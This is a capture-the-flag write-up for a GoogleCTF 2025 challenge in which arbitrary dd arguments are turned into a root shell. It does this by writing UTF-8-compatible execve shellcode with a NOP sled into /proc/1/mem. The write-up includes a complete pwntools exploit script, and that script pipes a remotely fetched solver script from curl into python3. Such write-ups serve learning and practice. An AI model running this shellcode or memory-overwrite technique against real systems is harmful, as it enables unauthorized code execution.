+++
title = "datadefinition"
date = 2025-08-13
authors = ["Hargun Kaur"]
+++
# The Handout
Let's begin by looking at the given files, `chall.py`, `Dockerfile`, and `nsjail.cfg`:
## chall.py
```python
# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import subprocess
import sys


def main():
    print('Do you like dd? It is my favorite old-style tool :D\n')
    line = input('  > What is your favorite dd line?: ').encode()
    user_input = input('  > Any input to go with it?: ').encode()
    print('I like it! Let\'s give it a go!')
    res = subprocess.run(['dd'] + line.split(), input=user_input,
        capture_output=True)
    print(res.stdout.decode('utf-8'))
    print(res.stderr.decode('utf-8'))
    print('It was fun, bye!')


if __name__ == '__main__':
    main()

```
The python script `chall.py`
- takes in the arguments for `dd` command as `line`, and also `user_input` as `stdin`
- runs [the `dd` command](https://en.wikipedia.org/wiki/Dd_(Unix)#See_also)
Note that the `user_input` needs to be encoded in utf-8 because the script decodes received bytes in utf-8 before using it.
## Dockerfile
```Dockerfile
# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
FROM ubuntu:24.04 as chroot

# ubuntu24 includes the ubuntu user by default
RUN /usr/sbin/userdel -r ubuntu && /usr/sbin/useradd --no-create-home -u 1000 user

RUN apt update && apt install -y python3

COPY fake_flag.txt /home/user/flag
COPY fake_flag.txt /home/user/flag.txt
COPY flag.txt <REDACTED>
COPY chall.py /home/user/

FROM gcr.io/kctf-docker/challenge@sha256:9f15314c26bd681a043557c9f136e7823414e9e662c08dde54d14a6bfd0b619f

COPY --from=chroot / /chroot

COPY nsjail.cfg /home/user/

CMD kctf_setup && \
    kctf_drop_privs \
    socat \
      TCP-LISTEN:1337,reuseaddr,fork \
      EXEC:"kctf_pow nsjail --config /home/user/nsjail.cfg -- /usr/bin/python3 -u /home/user/chall.py"
```
From the `Dockerfile`, we see that the challenge runs as UID 1000, non-root and drops privileges before running `chall.py`.
The python process has PID 1, so we can access
	- `dd`'s `stdin` using `/proc/self/0`
	- python's memory using `/proc/1/mem`
## nsjail.cfg
```
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# See options available at https://github.com/google/nsjail/blob/master/config.proto

name: "default-nsjail-configuration"
description: "Default nsjail configuration for pwnable-style CTF task."

mode: ONCE
uidmap {inside_id: "0"}
gidmap {inside_id: "0"}
keep_caps: true
rlimit_as_type: HARD
rlimit_cpu_type: HARD
rlimit_nofile_type: HARD
rlimit_nproc_type: HARD
rlimit_fsize_type: HARD
rlimit_fsize: 1024

cwd: "/home/user"

mount: [
  {
    src: "/chroot"
    dst: "/"
    is_bind: true
  },
  {
    dst: "/tmp"
    fstype: "tmpfs"
    rw: true
  },
  {
    dst: "/proc"
    fstype: "proc"
    rw: true
  },
  {
    src: "/etc/resolv.conf"
    dst: "/etc/resolv.conf"
    is_bind: true
  }
]
```
`nsjail.cfg` sets the maximum file size to 1KB and gives `/proc` and `/tmp` access.
# The Solution
Goal: Use `dd` to overwrite Python's executable memory with shellcode.
- Once Python's child process (`dd`) completes, the parent process will stop polling the child and continue executing Python instructions from a point in its own `.text` section.
	- We can look at the process maps when the challenge is running to find the address of Python's `.text` section.
- Use `dd` to seek to roughly around that address and write the contents of standard input.
	- The command would look something like: `dd if=/proc/self/0 of=/proc/1/mem seek=<some_offset>`.
- Write UTF-8 compatible shellcode.
	- [This Phrack article](https://phrack.org/issues/62/9) on the topic explains the rules:
		- Any instruction bytes between `0` and `7f` are not a problem.
		- Any byte above that requires a certain number of following bytes, and each following byte has its own valid range.
	- Take the `execve("/bin/sh")` shellcode and make it UTF-8 compliant.
	- It turns out that none of the instruction bytes in this shellcode are UTF-8 incompatible, so it works as is.
Here's the shellcode with explanation:
{{ img(id="/content/writeups/GoogleCTF2025/datadefinition/shellcode.jpg", alt="Explanation for shellcode", class="textCenter") }}

- There's an instruction, `\x31\xc9`, which has no side effects. You can use it to insert bytes that are outside the `0-7f` range.
- We can use this to create a NOP sled (a sequence of NOP instructions, e.g., `\x31\xc9\x90`).
- Write the string `b"/bin/sh"` and the NOP sled into memory at the specified offset, followed by our actual shellcode.
- The shellcode will then load the address of `"/bin/sh"` into the `rdi` register.
- As long as the NOP sled is large enough and the interpreter starts executing from somewhere within it, we'll reach your shellcode.
- Since you know the address of `"/bin/sh"`, you can load that into `rdi` and make the `syscall`.
- This way, we don't need to know the exact starting address; you just need to provide a large number of NOPs.
Putting it all together, we get the exploit script:
```python
from pwn import *

context.log_level = 'debug'

# Connect to challenge
p = remote('datadefinition.2025.ctfcompetition.com', 1337)

# ============ POW ============
p.recvuntil(b'You can run the solver with:\n    ')
pow_line = p.recvline().decode().strip()
token = pow_line.split()[-1]
print("Wait for POW to be solved...")

# Run: curl script | python3 - solve <token>
cmd = f"curl -sSL https://goo.gle/kctf-pow | python3 - solve {token}"
result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, text=True)
pow_ans = result.stdout.strip()
print("POW answer obtained!")

p.recvuntil(b'Solution? ')
p.sendline(pow_ans.encode())
# ============ POW ============

# Send dd arguments
payload = b'if=/proc/self/fd/0 of=/proc/1/mem bs=1 seek=4325376'
p.sendlineafter(b'  > What is your favorite dd line?: ', payload)

# Craft stdin payload
NOP_SLED_SIZE =0x1100

shellcode = b"\x89\xce\x90\x56\x68\x00\x00\x42\x00\x5f\x6a\x3b\x58\x48\x31\xd2\x90\x0f\x05"

payload = (
    b"/bin/sh\x00"
    + b"\x31\xc9\x90" * NOP_SLED_SIZE
    + b"\x31\xc9"
    + shellcode
)

p.sendlineafter(b'  > Any input to go with it?: ', payload)

p.recvuntil(b"I like it! Let's give it a go!\n")

# Access shell manually
p.interactive()
```
Now `id` command reveals we are root user
```
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```
Just ignore the red herrings...
```
$ ls
chall.py
flag
flag.txt

$ cat flag
It's not that easy pal... The flag is not here.
You need to get RCE for actual pwnage!

$ cat flag.txt
It's not that easy pal... The flag is not here.
You need to get RCE for actual pwnage!
```
...and navigate to the real flag!
```
$ cd /

$ ls
bin
boot
dev
etc
flag_spELRE7Rwc8D3pWkP1Ol0LqFXWAZgr9S.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

$ cat flag_spELRE7Rwc8D3pWkP1Ol0LqFXWAZgr9S.txt
CTF{GoodOlUnixToolsAndReadingSomePhrack}
```